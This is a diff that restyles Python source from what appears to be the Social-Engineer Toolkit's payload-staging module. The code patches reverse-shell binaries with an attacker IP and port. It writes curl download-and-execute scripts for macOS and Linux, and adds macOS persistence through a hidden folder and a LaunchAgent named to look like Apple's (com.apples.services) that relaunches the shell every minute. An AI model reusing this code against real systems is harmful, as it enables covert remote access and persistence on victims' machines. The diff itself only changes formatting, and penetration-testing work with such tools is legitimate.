@@ -31,14 +31,16 @@ for line in fileopen:
         if upx_encode == "ON":
             if not os.path.isfile(upx_path):
                 if operating_system != "windows":
-                    print_warning("UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
+                    print_warning(
+                        "UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
                 upx_encode == "OFF"
     # if we removed the set shells to free up space, needed for pwniexpress
-    match2= re.search("SET_INTERACTIVE_SHELL=", line)
+    match2 = re.search("SET_INTERACTIVE_SHELL=", line)
     if match2:
         line = line.replace("SET_INTERACTIVE_SHELL=", "").lower()
         if line == "off":
-            sys.exit("\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")
+            sys.exit(
+                "\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")
 
 # make directory if it's not there
 if not os.path.isdir(setdir + "/web_clone/"):
@@ -50,13 +52,12 @@ if os.path.isfile(setdir + "/interface"):
     for line in fileopen:
         ipaddr = line.rstrip()
 
-
-
         # Open the IPADDR file
     if check_options("IPADDR=") != 0:
         ipaddr = check_options("IPADDR=")
     else:
-        ipaddr = raw_input(setprompt("0", "IP address to connect back on for the reverse listener"))
+        ipaddr = raw_input(
+            setprompt("0", "IP address to connect back on for the reverse listener"))
         update_options("IPADDR=" + ipaddr)
         webserver = ipaddr
 
@@ -65,7 +66,8 @@ else:
     if check_options("IPADDR=") != 0:
         ipaddr = check_options("IPADDR=")
     else:
-        ipaddr = raw_input(setprompt("0", "IP address to connect back on for the reverse listener"))
+        ipaddr = raw_input(
+            setprompt("0", "IP address to connect back on for the reverse listener"))
         update_options("IPADDR=" + ipaddr)
     webserver = ipaddr
 
@@ -74,13 +76,14 @@ if check_options("PORT=") != 0:
     port = check_options("PORT=")
 
 else:
-    port = raw_input(setprompt("0", "Port you want to use for the connection back"))
+    port = raw_input(
+        setprompt("0", "Port you want to use for the connection back"))
 
 
 # define the main variables here
 
 # generate a random executable name per instance
-exe_name = generate_random_string(10,10) + ".exe"
+exe_name = generate_random_string(10, 10) + ".exe"
 
 webserver = webserver + " " + port
 
@@ -89,7 +92,8 @@ reverse_connection = webserver
 
 webserver = exe_name + " " + webserver
 
-# this is generated through payloadgen.py and lets SET know if its a RATTE payload or SET payload
+# this is generated through payloadgen.py and lets SET know if its a RATTE
+# payload or SET payload
 if os.path.isfile(setdir + "/set.payload"):
     fileopen = file(setdir + "/set.payload", "r")
     for line in fileopen:
@@ -108,23 +112,23 @@ if os.path.isfile(setdir + "/set.payload.posix"):
 # if we selected the SET Interactive shell in payloadgen
 if payload_selection == "SETSHELL":
     # replace ipaddress with one that we need for reverse connection back
-    fileopen = open("src/payloads/set_payloads/downloader.windows" , "rb")
+    fileopen = open("src/payloads/set_payloads/downloader.windows", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe" , "wb")
-    host = int(len(exe_name)+1) * "X"
-    webserver_count = int(len(webserver)+1) * "S"
-    ipaddr_count = int(len(ipaddr)+1) * "M"
-    filewrite.write(data.replace(str(host), exe_name+"\x00", 1))
+    filewrite = open(setdir + "/msf.exe", "wb")
+    host = int(len(exe_name) + 1) * "X"
+    webserver_count = int(len(webserver) + 1) * "S"
+    ipaddr_count = int(len(ipaddr) + 1) * "M"
+    filewrite.write(data.replace(str(host), exe_name + "\x00", 1))
     filewrite.close()
-    fileopen = open(setdir + "/msf.exe" , "rb")
+    fileopen = open(setdir + "/msf.exe", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe" , "wb")
-    filewrite.write(data.replace(str(webserver_count), webserver+"\x00", 1))
+    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite.write(data.replace(str(webserver_count), webserver + "\x00", 1))
     filewrite.close()
-    fileopen = open(setdir + "/msf.exe" , "rb")
+    fileopen = open(setdir + "/msf.exe", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe" , "wb")
-    filewrite.write(data.replace(str(ipaddr_count), ipaddr+"\x00", 1))
+    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite.write(data.replace(str(ipaddr_count), ipaddr + "\x00", 1))
     filewrite.close()
 
 # if we selected RATTE in our payload selection
@@ -132,21 +136,21 @@ if payload_selection == "RATTE":
     fileopen = file("src/payloads/ratte/ratte.binary", "rb")
     data = fileopen.read()
     filewrite = open(setdir + "/msf.exe", "wb")
-    host = int(len(ipaddr)+1) * "X"
-    rPort = int(len(str(port))+1) * "Y"
-    filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
+    host = int(len(ipaddr) + 1) * "X"
+    rPort = int(len(str(port)) + 1) * "Y"
+    filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
     filewrite.close()
     fileopen = open(setdir + "/msf.exe", "rb")
     data = fileopen.read()
     filewrite = open(setdir + "/msf.exe", "wb")
-    filewrite.write(data.replace(str(rPort), str(port)+"\x00", 1))
+    filewrite.write(data.replace(str(rPort), str(port) + "\x00", 1))
     filewrite.close()
 
 print_status("Done, moving the payload into the action.")
 
 if upx_encode == "ON" or upx_encode == "on":
     # core upx
-    pass 
+    pass
 
 if os.path.isfile(setdir + "/web_clone/msf.exe"):
     os.remove(setdir + "/web_clone/msf.exe")
@@ -156,86 +160,116 @@ if os.path.isfile(setdir + "/msf.exe"):
 if payload_selection == "SETSHELL":
     if os.path.isfile(setdir + "/web_clone/x"):
         os.remove(setdir + "/web_clone/x")
-    shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" % (definepath), setdir + "/web_clone/x")
+    shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" %
+                    (definepath), setdir + "/web_clone/x")
 
 # if we are targetting nix
 if posix == True:
-    print_info("Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
+    print_info(
+        "Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
     filewrite = file(setdir + "/web_clone/mac.bin", "w")
     payload_flags = webserver.split(" ")
     # grab osx binary name
-    osx_name = generate_random_string(10,10)
-    downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
+    osx_name = generate_random_string(10, 10)
+    downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (
+        payload_flags[1], osx_name, osx_name, osx_name, osx_name, payload_flags[1], payload_flags[2])
     filewrite.write(downloader + "\n")
     persistence = check_config("ENABLE_PERSISTENCE_OSX=").lower()
     if persistence == "on":
-        # modified persistence osx from http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+        # modified persistence osx from
+        # http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
         filewrite.write(r"mkdir ~/Library/.hidden")
         filewrite.write("\n")
         filewrite.write("cp /tmp/%s ~/Library/.hidden" % (osx_name))
         filewrite.write("\n")
         filewrite.write(r"echo '#!/bin/bash' > ~/Library/.hidden/connect.sh")
         filewrite.write("\n")
-        filewrite.write("echo './%s %s %s &' >> ~/Library/.hidden/connect.sh" % (osx_name, payload_flags[1], payload_flags[2]))
+        filewrite.write("echo './%s %s %s &' >> ~/Library/.hidden/connect.sh" %
+                        (osx_name, payload_flags[1], payload_flags[2]))
         filewrite.write("\n")
-        filewrite.write(r"echo 'chmod +x ~/Library/.hidden/connect.sh' >> ~/Library/.hidden/connect.sh")
+        filewrite.write(
+            r"echo 'chmod +x ~/Library/.hidden/connect.sh' >> ~/Library/.hidden/connect.sh")
         filewrite.write("\n")
         filewrite.write(r"mkdir ~/Library/LaunchAgents")
         filewrite.write("\n")
-        filewrite.write("echo '<plist version=\"1.0\">' > ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            "echo '<plist version=\"1.0\">' > ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<key>Label</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<key>Label</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<string>com.apples.services</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<string>com.apples.services</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<key>ProgramArguments</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<key>ProgramArguments</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<string>/bin/sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<string>/bin/sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write("echo '<string>'$HOME'/Library/.hidden/connect.sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            "echo '<string>'$HOME'/Library/.hidden/connect.sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '</array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '</array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<key>RunAtLoad</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<key>RunAtLoad</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<key>StartInterval</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<key>StartInterval</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<integer>60</integer>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<integer>60</integer>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<key>AbandonProcessGroup</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<key>AbandonProcessGroup</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '</dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '</dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"echo '</plist>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"echo '</plist>' >> ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"chmod 600 ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"chmod 600 ~/Library/LaunchAgents/com.apples.services.plist")
         filewrite.write("\n")
-        filewrite.write(r"launchctl load ~/Library/LaunchAgents/com.apples.services.plist")
+        filewrite.write(
+            r"launchctl load ~/Library/LaunchAgents/com.apples.services.plist")
 
     filewrite.close()
     # grab nix binary name
     #linux_name = check_options("NIX.BIN=")
-    linux_name = generate_random_string(10,10)
-    downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
+    linux_name = generate_random_string(10, 10)
+    downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (
+        payload_flags[1], linux_name, linux_name, linux_name, payload_flags[1], payload_flags[2])
     filewrite = file(setdir + "/web_clone/nix.bin", "w")
     filewrite.write(downloader)
     filewrite.close()
-    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx", setdir + "/web_clone/%s" % (osx_name))
-    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux", setdir + "/web_clone/%s" % (linux_name))
+    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx",
+                    setdir + "/web_clone/%s" % (osx_name))
+    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux",
+                    setdir + "/web_clone/%s" % (linux_name))
 
     # copy over the downloader scripts
     osx_down = check_options("MAC.BIN=")
     lin_down = check_options("NIX.BIN=")
-    shutil.copyfile(setdir + "/web_clone/nix.bin", setdir + "/web_clone/%s" % (lin_down))
-    shutil.copyfile(setdir + "/web_clone/mac.bin", setdir + "/web_clone/%s" % (osx_down))
+    shutil.copyfile(setdir + "/web_clone/nix.bin",
+                    setdir + "/web_clone/%s" % (lin_down))
+    shutil.copyfile(setdir + "/web_clone/mac.bin",
+                    setdir + "/web_clone/%s" % (osx_down))
 
 # check to see if we are using a staged approach or direct shell
 stager = check_config("SET_SHELL_STAGER=").lower()
@@ -244,7 +278,8 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
     if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
         # ensure that index.html is really there
         if os.path.isfile(setdir + "/web_clone/index.html"):
-            print_status("Stager turned off, prepping direct download payload...")
+            print_status(
+                "Stager turned off, prepping direct download payload...")
             fileopen = file(setdir + "/web_clone/index.html", "r")
             filewrite = file(setdir + "/web_clone/index.html.3", "w")
             data = fileopen.read()
@@ -254,21 +289,26 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
             filewrite.close()
             time.sleep(1)
 
-            # here we remove old stuff and replace with everything we need to be newer
+            # here we remove old stuff and replace with everything we need to
+            # be newer
             if payload_selection == "SETSHELL":
                 try:
                     if os.path.isfile(setdir + "/web_clone/index.html"):
                         os.remove(setdir + "/web_clone/index.html")
-                    shutil.copyfile(setdir + "/web_clone/index.html.3", setdir + "/web_clone/index.html")
+                    shutil.copyfile(setdir + "/web_clone/index.html.3",
+                                    setdir + "/web_clone/index.html")
                     if os.path.isfile(setdir + "/web_clone/index.html.3"):
                         os.remove(setdir + "/web_clone/index.html.3")
                     if os.path.isfile(setdir + "/web_clone/msf.exe"):
                         os.remove(setdir + "/web_clone/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/x", setdir + "/web_clone/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                    shutil.copyfile(setdir + "/web_clone/x",
+                                    setdir + "/web_clone/msf.exe")
+                    shutil.copyfile(
+                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
                     if os.path.isfile(setdir + "/msf.exe"):
                         os.remove(setdir + "/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                    shutil.copyfile(
+                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
 
                 # catch errors, will convert to log later
                 except Exception, error:
@@ -279,16 +319,20 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
                 try:
                     if os.path.isfile(setdir + "/web_clone/index.html"):
                         os.remove(setdir + "/web_clone/index.html")
-                    shutil.copyfile(setdir + "/web_clone/index.html.3", setdir + "/web_clone/index.html")
+                    shutil.copyfile(setdir + "/web_clone/index.html.3",
+                                    setdir + "/web_clone/index.html")
                     if os.path.isfile(setdir + "/web_clone/index.html.3"):
                         os.remove(setdir + "/web_clone/index.html.3")
                     if os.path.isfile(setdir + "/web_clone/msf.exe"):
                         os.remove(setdir + "/web_clone/msf.exe")
-                    shutil.copyfile("src/payloads/set_payloads/http_shell.binary", setdir + "/web_clone/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                    shutil.copyfile(
+                        "src/payloads/set_payloads/http_shell.binary", setdir + "/web_clone/msf.exe")
+                    shutil.copyfile(
+                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
                     if os.path.isfile(setdir + "/msf.exe"):
                         os.remove(setdir + "/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                    shutil.copyfile(
+                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
 
                 # catch errors, will convert to log later
                 except Exception, error:
